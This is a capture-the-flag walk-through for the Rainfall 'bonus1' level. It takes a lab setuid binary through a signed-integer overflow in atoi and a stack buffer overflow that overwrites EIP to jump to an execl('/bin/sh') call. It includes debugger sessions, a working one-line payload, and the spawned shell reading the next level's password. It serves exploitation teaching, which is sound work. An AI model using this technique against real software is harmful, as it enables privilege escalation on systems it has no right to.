## Walk-through Bonus1

### Introduction
Bonus1 is part of the Rainfall challenge series, where the goal is to escalate privileges by exploiting a vulnerable binary. This walk-through covers analyzing the binary, identifying vulnerabilities, and obtaining elevated access.

### Binary Information
The target binary is a 32-bit ELF executable with setuid permissions. This means that when executed, it runs with the privileges of its owner (bonus2), allowing for privilege escalation if exploited successfully.

### Security Checks
Checking the binary’s security protections:
```bash
bonus1@RainFall:~$ checksec --file bonus1
```
Output:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   bonus1
```
Observations:
- **No RELRO:** No read-only relocation, meaning GOT entries can be modified.
- **No stack canary:** No protection against buffer overflow.
- **NX disabled:** The stack is executable, allowing shellcode execution.
- **No PIE:** The binary is not position-independent, meaning addresses are static.

### Source Code Analysis
The binary’s decompiled source code:
```c
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv) {
    int i;
    char buffer[40];
    int n;

    n = atoi(argv[1]);
    if (n < 10) {
        memcpy(buffer, argv[2], n * 4);
        if (n == 0x574f4c46) {
            execl("/bin/sh", "sh", 0);
        }
        i = 0;
    } else {
        i = 1;
    }
    return i;
}
```

### Integer Overflow to Bypass Checks
The `atoi(argv[1])` function converts the input string to an integer. However, it does not check for overflow conditions, allowing us to pass a large negative number to bypass the `if (n < 10)` check.

Example:
```bash
gdb-peda$ r -2147483647 helllo
gdb-peda$ p/d $ecx
$1 = 4
```
This causes `n * 4` to wrap around due to integer overflow, allowing `memcpy` to copy excessive data into the buffer.

Using `gdb-peda` to determine the correct value to achieve buffer overflow:
```bash
gdb-peda$ r -2147483633 hello
gdb-peda$ p/d $ecx
$1 = 60
```
This means we need to provide `-2147483633` as the first argument to trigger the buffer overflow with a size of **60 bytes**.

### Finding the Overflow Offset
The vulnerability exists in:
```c
memcpy(buffer, argv[2], n * 4);
```
- `buffer` is 40 bytes.
- The program does not validate `n * 4`, leading to buffer overflow.
- We control `n` from `argv[1]` and `buffer` from `argv[2]`.

Using `gdb-peda` to determine the overflow point:
```bash
gdb-peda$ cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
gdb-peda$ r -2147483633 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
EIP: 0x6161616f ('oaaa')

gdb-peda$ cyclic -l 0x6161616f
56
```
The EIP offset is **56**.

### Exploitation Strategy
- Overflow the buffer to overwrite EIP with the address of `execl("/bin/sh", "sh", 0);`.
- The function call at address `0x08048482` executes `/bin/sh`.

### Finding the Target Function Address
Disassembling `main()`:
```bash
gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x08048424 <+0>:     push   ebp
   0x08048425 <+1>:     mov    ebp,esp
   0x08048427 <+3>:     and    esp,0xfffffff0
   0x0804842a <+6>:     sub    esp,0x40
   0x0804842d <+9>:     mov    eax,DWORD PTR [ebp+0xc]
   0x08048430 <+12>:    add    eax,0x4
   0x08048433 <+15>:    mov    eax,DWORD PTR [eax]
   0x08048435 <+17>:    mov    DWORD PTR [esp],eax
   0x08048438 <+20>:    call   0x8048360 <atoi@plt>
   0x0804843d <+25>:    mov    DWORD PTR [esp+0x3c],eax
   0x08048441 <+29>:    cmp    DWORD PTR [esp+0x3c],0x9
   0x08048446 <+34>:    jle    0x804844f <main+43>
   0x08048448 <+36>:    mov    eax,0x1
   0x0804844d <+41>:    jmp    0x80484a3 <main+127>
   0x0804844f <+43>:    mov    eax,DWORD PTR [esp+0x3c]
   0x08048453 <+47>:    lea    ecx,[eax*4+0x0]
=> 0x0804845a <+54>:    mov    eax,DWORD PTR [ebp+0xc]
   0x0804845d <+57>:    add    eax,0x8
   0x08048460 <+60>:    mov    eax,DWORD PTR [eax]
   0x08048462 <+62>:    mov    edx,eax
   0x08048464 <+64>:    lea    eax,[esp+0x14]
   0x08048468 <+68>:    mov    DWORD PTR [esp+0x8],ecx
   0x0804846c <+72>:    mov    DWORD PTR [esp+0x4],edx
   0x08048470 <+76>:    mov    DWORD PTR [esp],eax
   0x08048473 <+79>:    call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:    cmp    DWORD PTR [esp+0x3c],0x574f4c46
   0x08048480 <+92>:    jne    0x804849e <main+122>
   0x08048482 <+94>:    mov    DWORD PTR [esp+0x8],0x0
   0x0804848a <+102>:   mov    DWORD PTR [esp+0x4],0x8048580
   0x08048492 <+110>:   mov    DWORD PTR [esp],0x8048583
   0x08048499 <+117>:   call   0x8048350 <execl@plt>
   0x0804849e <+122>:   mov    eax,0x0
   0x080484a3 <+127>:   leave
   0x080484a4 <+128>:   ret
End of assembler dump.
```
Identified `execl("/bin/sh")` call at **0x08048482**.

### Gaining Access
Exploit payload:
```bash
bonus1@RainFall:~$ ./bonus1 -2147483633 `python2 -c "print 'A'*56 + '\x82\x84\x04\x08'"`
```
After executing, a shell is spawned:
```bash
$ id
uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
### Mitigation Strategies
To prevent exploitation:
- **Enable stack canaries** to detect buffer overflows.
- **Implement bounds checking** on user input.
- **Enable ASLR and NX bit** to prevent predictable memory layouts and execution of injected shellcode.

### Conclusion
This challenge demonstrates classic buffer overflow exploitation by overwriting EIP to redirect execution. Understanding binary protections and manual debugging in GDB are crucial for developing exploitation skills.


